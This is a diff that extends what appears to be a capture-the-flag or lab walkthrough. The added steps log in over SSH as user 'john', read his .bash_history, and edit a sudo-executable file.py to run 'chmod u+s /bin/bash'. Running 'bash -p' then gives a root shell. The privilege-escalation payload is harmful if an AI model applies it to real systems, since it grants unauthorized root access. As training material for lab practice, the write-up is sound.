@@ -281,3 +281,37 @@ stty rows 61 columns 184
 <h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/118101bd-76d6-4638-b12b-f43de6121813"></picture></h3>
 
 <h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/3e8420fb-4bf4-435a-ba04-d7a4cd17f979"></picture><br>by executing the “toto” binary we are now the user “john”.</h3>
+
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/0fa99b60-4a39-47db-aeeb-948e2c529ce7"></picture><br>Now we have a password</h3>
+
+### **- Now we will connect via SSH**
+```bash
+ssh john@192.168.1.117
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e6c191b1-5464-40bb-9f81-5116198f6563"></picture><br>We are in!</h3>
+
+### **Once inside the machine of the user “john” we will now look for clues as to what the user has been doing to get an idea of how we can elevate our privileges.
+Our first step will be to check the .bash_history as this will give us an idea of how the user works.**
+```bash
+cat .bash_history
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/c639148a-9675-4c7c-9738-844cc2e4478d"></picture></h3>
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/dea13655-895e-4b61-9c1d-8d101f302551"></picture><br>clearly we can see how this is done using the file 'file.py' since python can be used without root permissions</h3>
+
+### **- Now we have to modify the file “file.py” so that when we execute it, it elevates our privileges and we can be “root”.**
+```bash
+nano file.py
+```
+```bash
+import os
+
+os.system("chmod u+s /bin/bash")
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/614b8136-73cb-48a0-ba1c-a735da3e498e"></picture></h3>
+
+### **- We execute the ''file.py''**
+```bash
+sudo /usr/bin/python3 /home/john/file.py
+bash -p
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/67a43a3f-70a9-48ab-8280-b83050e677ca"></picture><br>We are in!</h3>
